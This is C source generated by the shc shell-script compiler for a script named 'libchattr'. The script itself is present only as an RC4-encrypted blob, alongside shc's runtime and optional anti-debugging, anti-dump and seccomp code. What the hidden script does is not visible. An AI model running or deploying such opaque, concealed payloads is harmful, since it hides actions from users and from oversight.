#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f libchattr -o libchattr 
#endif

static  char data [] = 
#define      chk1_z	22
#define      chk1	((&data[3]))
	"\340\324\377\332\370\250\162\204\362\225\275\053\012\110\022\233"
	"\027\117\101\366\257\076\156\161\353\233\045\107"
#define      chk2_z	19
#define      chk2	((&data[28]))
	"\363\215\053\211\235\232\125\114\207\145\216\127\213\111\076\073"
	"\224\375\131\121"
#define      msg2_z	19
#define      msg2	((&data[52]))
	"\126\041\274\320\237\310\246\260\126\165\372\214\352\325\267\321"
	"\351\055\312\126\047\056\242\047\277\260"
#define      rlax_z	1
#define      rlax	((&data[74]))
	"\333"
#define      xecc_z	15
#define      xecc	((&data[77]))
	"\164\262\371\114\036\151\020\032\117\130\115\366\307\055\070\357"
	"\170"
#define      opts_z	1
#define      opts	((&data[92]))
	"\253"
#define      text_z	1607
#define      text	((&data[440]))
	"\054\002\237\044\034\373\165\254\337\027\002\000\323\323\050\222"
	"\204\324\337\362\063\203\031\247\066\311\260\216\133\215\346\207"
	"\217\205\253\254\201\041\130\140\070\133\141\013\056\211\236\263"
	"\136\176\246\221\002\277\070\071\211\351\307\344\166\256\154\006"
	"\063\027\262\264\071\012\024\161\145\166\175\224\377\034\107\135"
	"\233\355\357\235\255\047\326\067\021\236\034\207\114\210\215\200"
	"\240\077\064\332\112\111\113\260\277\311\104\277\346\214\034\201"
	"\171\013\037\047\063\366\136\104\225\172\314\342\003\131\142\243"
	"\231\227\175\344\341\311\224\240\223\331\140\172\145\174\373\336"
	"\210\033\005\274\022\144\001\247\336\315\211\341\046\353\205\300"
	"\203\003\244\144\315\071\004\141\022\145\333\167\341\327\126\152"
	"\362\134\047\004\301\050\254\237\365\065\201\034\041\007\335\244"
	"\013\202\010\330\273\015\071\316\162\025\105\124\354\234\277\337"
	"\371\346\344\272\016\220\132\003\306\334\040\347\343\375\214\357"
	"\177\225\307\072\242\001\010\025\027\116\151\003\353\050\343\345"
	"\016\307\240\035\130\372\040\036\327\101\006\273\076\223\252\275"
	"\050\162\370\312\164\001\340\213\117\112\217\073\162\162\040\201"
	"\072\301\237\222\273\300\261\222\001\270\115\077\113\370\375\163"
	"\152\365\076\336\366\036\152\106\151\371\202\333\154\243\135\246"
	"\144\374\071\040\275\352\263\276\242\001\376\356\371\373\142\143"
	"\361\240\102\350\277\254\057\050\246\261\004\022\125\142\270\271"
	"\137\362\332\034\334\215\332\177\216\330\155\356\214\077\374\176"
	"\001\070\041\340\175\243\300\233\003\203\223\250\124\101\265\034"
	"\062\235\036\131\255\304\363\241\317\107\075\040\377\372\146\171"
	"\176\202\110\157\122\256\246\236\266\255\313\224\120\007\060\003"
	"\270\123\215\134\347\350\372\355\302\360\135\132\251\365\006\004"
	"\007\350\266\340\210\174\226\363\130\327\335\216\073\116\065\124"
	"\007\322\303\302\054\154\242\334\141\021\244\024\274\365\362\203"
	"\034\042\127\001\036\171\001\270\033\135\063\364\063\133\330\011"
	"\164\213\373\043\147\360\036\175\231\377\204\072\014\304\340\323"
	"\264\050\130\010\067\363\365\370\261\250\152\206\212\304\040\365"
	"\251\135\037\370\302\303\161\201\146\072\307\333\241\140\226\063"
	"\140\066\110\005\015\267\224\124\137\060\150\377\105\142\004\254"
	"\236\265\122\272\130\077\140\257\065\365\006\273\302\063\025\225"
	"\331\352\147\260\062\370\032\123\043\230\057\212\113\032\063\204"
	"\026\275\077\105\250\127\065\125\355\311\216\066\302\015\027\252"
	"\361\064\263\163\375\156\045\257\025\023\061\031\002\155\045\320"
	"\152\062\072\135\100\270\323\076\170\321\326\271\137\337\072\167"
	"\121\133\006\177\075\156\011\342\106\206\014\302\230\247\255\365"
	"\245\261\233\125\055\254\353\057\354\267\241\026\305\000\064\202"
	"\046\347\342\071\164\267\345\053\242\034\100\367\245\021\025\224"
	"\112\256\126\064\113\023\302\347\131\064\020\257\236\151\170\272"
	"\133\100\103\156\206\026\206\363\012\255\335\035\210\252\173\077"
	"\145\367\277\342\107\076\056\047\255\147\306\261\257\364\006\220"
	"\064\216\034\030\216\063\342\041\342\363\172\257\071\334\031\077"
	"\375\003\156\214\073\227\171\031\376\256\264\143\244\056\120\166"
	"\317\166\314\354\125\072\333\312\302\053\315\326\222\070\033\267"
	"\126\040\353\332\331\004\037\003\263\044\047\075\327\063\304\222"
	"\232\132\121\140\357\302\375\102\355\203\201\340\260\052\071\326"
	"\230\370\302\362\001\072\151\300\245\176\346\162\347\211\034\311"
	"\242\042\340\115\017\033\125\337\140\100\334\226\224\120\215\155"
	"\244\212\336\352\057\113\130\272\063\111\074\133\312\262\323\354"
	"\062\000\011\216\016\223\356\342\065\274\072\215\175\211\177\353"
	"\007\000\251\361\313\061\277\052\126\312\374\124\160\127\113\306"
	"\320\057\032\302\153\076\322\364\250\276\040\041\376\216\357\357"
	"\377\217\017\156\045\151\314\001\243\326\032\021\057\170\175\131"
	"\321\352\265\030\274\112\261\267\165\360\377\173\221\222\122\134"
	"\222\116\142\041\156\062\273\063\212\274\266\173\240\155\135\324"
	"\261\172\166\336\306\304\213\067\326\011\301\216\046\231\024\213"
	"\366\125\074\307\074\044\202\147\230\251\123\075\164\367\376\255"
	"\076\265\173\216\106\227\053\147\061\040\104\047\067\331\206\326"
	"\371\166\245\123\111\254\372\072\064\026\361\012\032\126\222\241"
	"\111\131\347\111\104\150\237\222\217\252\112\347\241\102\032\162"
	"\240\035\016\175\066\205\003\017\312\210\036\234\337\300\225\070"
	"\126\113\344\306\276\050\334\107\125\076\307\052\060\137\355\063"
	"\134\263\354\374\070\111\041\317\215\163\303\135\362\136\111\203"
	"\023\133\233\117\020\330\104\312\146\016\121\036\024\137\116\170"
	"\205\272\030\210\336\171\111\234\035\013\075\322\325\044\262\265"
	"\351\227\210\072\144\003\306\230\035\177\016\335\362\020\232\206"
	"\170\016\262\037\013\153\145\043\216\136\224\046\330\370\242\307"
	"\321\313\313\123\101\025\350\257\056\250\316\001\133\273\136\237"
	"\055\252\021\231\213\333\371\052\351\120\116\001\163\016\136\017"
	"\212\131\264\221\253\220\207\030\103\244\324\302\203\252\024\215"
	"\071\276\153\137\106\255\150\275\117\365\233\335\300\340\135\207"
	"\332\142\311\045\014\043\252\354\234\233\354\265\330\330\263\076"
	"\320\146\001\134\122\333\332\342\350\314\103\222\107\175\117\057"
	"\352\311\260\006\201\077\315\003\345\011\004\044\346\125\210\116"
	"\215\236\025\312\262\204\040\345\205\220\346\206\355\360\272\162"
	"\121\307\034\070\061\152\233\046\217\263\057\306\204\233\366\227"
	"\213\167\062\102\202\340\165\011\256\000\020\372\241\061\344\125"
	"\310\047\372\120\050\270\276\177\207\344\170\010\112\214\144\374"
	"\110\314\001\371\330\237\235\071\263\311\046\062\022\165\065\265"
	"\147\041\306\061\022\250\355\377\205\015\317\142\024\127\137\273"
	"\245\206\352\212\352\264\156\017\021\126\367\263\346\333\322\130"
	"\322\135\313\122\065\273\143\156\110\044\334\041\334\154\022\256"
	"\025\377\266\245\052\225\346\046\110\312\044\151\144\243\265\136"
	"\131\331\351\336\256\162\352\125\250\272\031\326\016\301\355\235"
	"\172\344\173\010\356\235\075\207\272\065\360\025\036\216\344\073"
	"\122\235\316\011\107\236\076\353\303\122\032\126\234\145\124\362"
	"\126\302\327\245\035\140\230\230\143\175\123\067\276\221\304\356"
	"\244\244\175\004\326\150\177\156\120\303\026\100\023\226\153\241"
	"\226\253\257\020\166\057\325\367\305\156\053\123\330\110\020\163"
	"\355\146\005\105\362\220\007\033\324\254\137\315\012\261\216\216"
	"\352\351\071\236\004\173\026\062\045\244\237\320\213\143\066\063"
	"\310\120\323\325\016\313\164\220\163\377\064\224\022\365\264\144"
	"\213\213\374\031\360\153\134\300\140\061\061\130\204\265\072\335"
	"\003\206\020\246\224\334\206\224\116\375\175\054\353\126\116\051"
	"\032\313\325\065\353\163\104\272\134\315\341\107\225\063\225\274"
	"\366\134\221\173\076\123\145\262\314\120\124\032\247\006\156\165"
	"\032\037\023\053\056\041\075\134\311\240\024\367\063\223\347\212"
	"\324\130\250\356\331\102\155\364\344\013\200\060\345\334\116\333"
	"\022\324\167\166\130\254\100\064\010\245\315\154\356\050\263\045"
	"\202\010\220\110\164\135\360\164\300\317\033\144\351\271\331\147"
	"\350\336\204\353\074\142\143\036\115\316\213\245\275\243\062\364"
	"\046\070\271\036\126\260\371\341\010\221\256\341\057\066\353\172"
	"\351\173\252\134\154\277\133\077\142\263\337\044\171\234\305\260"
	"\267\233\323\227\251\011\120\136\157\217\324\216\111\043\231\033"
	"\344\176\221\035\173\243\356\172\224\264\345\306\237\125\051\324"
	"\102\276\132\344\216\142\075\257\325\165\051\306\326\036\302\267"
	"\173\107\075\023\145\375\233\250\055\002\004\340\144\155\334\373"
	"\271\334\372\246\142\201\246\303\371\301\115\363\040\017\003\254"
	"\217\300\175\335\111\227\026\227\037\304\116\336\376\330\077\176"
	"\115\255\133\102\043\044\040\232\113\240\370\314\350\340\027\174"
	"\162\204\205\173\304\016\045\334\254\362\241\120\373\256\340\047"
	"\305\121\236\261\056\273\314\303\136\121\151\155\343\267\226\163"
	"\056\061\216\176\256\033\125\062\251\371\112\035\105\020\320\203"
	"\302\247\003\251\372\265\156\035\320\214\257\236\130\041\260\330"
	"\120\165\026\144\244\345\002\020\077\007\071\237\223\102\127\047"
	"\055\202\275\002\260\116\344\314\341\341\006\251\251\236\311\220"
	"\036\111\145\061\015\102\222\221\360\053\354\006\036\214\173\062"
	"\166\262\021\054\145\253\220\137\345\200\140\046\166\127\253\126"
	"\065\022\312\345\151\205\165\061\052\044\031\021\316\314\120\127"
	"\051\115\207\324\317\353\305\160\056\255\060\333\334\131\201\216"
	"\135\223\343\300\114\235\037\076\167\073\033\004\026\233\222\357"
	"\011\032\303\331\006\210\111\064\065\172\017\022\323\220\240\061"
	"\044\203\361\161\040\020\257\230\114\313\234\142\146\057\122\157"
	"\111\025\110\117\235\222\204\323\014\223\345\340\044\206\021\111"
	"\012\002\272\053\023\151\303\137\065\137\302\233\216\024\013\330"
	"\051\124\050\307\346\254\232\363\100\200\323\145\006\344\256\020"
	"\347\150\073\372\322\377\131\007\136\034\243\355\061\256\306\133"
	"\003\356\042\351\233\275\335\334\076\261\101"
#define      inlo_z	3
#define      inlo	((&data[2184]))
	"\135\036\145"
#define      lsto_z	1
#define      lsto	((&data[2187]))
	"\310"
#define      tst2_z	19
#define      tst2	((&data[2190]))
	"\221\322\025\362\275\072\326\021\344\003\040\147\166\121\221\261"
	"\346\124\212\340\245"
#define      date_z	1
#define      date	((&data[2209]))
	"\064"
#define      pswd_z	256
#define      pswd	((&data[2266]))
	"\205\243\172\210\222\235\162\056\133\117\012\231\001\114\336\227"
	"\075\064\025\226\307\215\301\130\137\364\110\116\312\046\156\117"
	"\312\351\330\134\206\112\213\341\232\226\173\234\343\131\063\040"
	"\216\111\266\126\327\167\256\067\041\355\371\307\010\142\200\262"
	"\063\276\047\245\144\372\325\300\013\005\110\052\316\255\076\306"
	"\101\150\271\134\222\142\237\264\117\231\173\130\373\374\012\056"
	"\272\062\324\036\054\252\336\070\257\047\143\175\324\242\104\025"
	"\012\376\161\235\140\021\121\260\252\315\010\245\311\023\324\204"
	"\106\250\242\163\123\201\254\003\250\017\201\174\261\306\221\273"
	"\304\003\131\044\024\252\325\277\170\336\144\102\362\070\306\070"
	"\341\150\253\064\352\127\067\222\147\271\017\031\177\241\324\103"
	"\244\056\150\271\330\075\170\121\033\335\223\015\025\131\105\366"
	"\302\361\053\254\110\143\077\260\034\116\311\233\357\236\336\224"
	"\314\106\116\245\204\307\366\237\244\212\254\271\343\362\260\245"
	"\343\333\121\054\077\220\334\133\337\246\367\316\104\326\143\021"
	"\035\261\266\241\170\255\100\034\067\355\326\032\337\206\300\302"
	"\142\022\357\242\242\313\375\201\162\365\120\266\313\263\310\350"
	"\145\177\211\335\054\312\372\144\267\320\176\226\127\077\131\272"
	"\121\110\134\364\024\132\166\206\117\306\075\032\172\006\003\337"
	"\205\215\275\261\127\270\025\016\154\367\205\066\035\363\206\347"
#define      msg1_z	65
#define      msg1	((&data[2536]))
	"\143\251\317\105\104\146\260\362\211\177\306\361\033\100\057\137"
	"\007\174\115\013\026\117\176\203\022\132\027\155\341\235\036\247"
	"\160\312\212\243\356\350\143\107\304\225\352\321\135\072\143\065"
	"\105\327\173\121\074\354\266\016\133\317\226\255\142\346\043\170"
	"\301\104\022\153\131\351\132\300\340\111\032"
#define      shll_z	10
#define      shll	((&data[2606]))
	"\135\065\122\027\112\331\074\242\312\126\144\040"
#define      tst1_z	22
#define      tst1	((&data[2618]))
	"\255\225\331\165\201\334\041\143\315\072\135\017\153\361\336\346"
	"\071\022\231\232\104\367\300\154\004\245"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
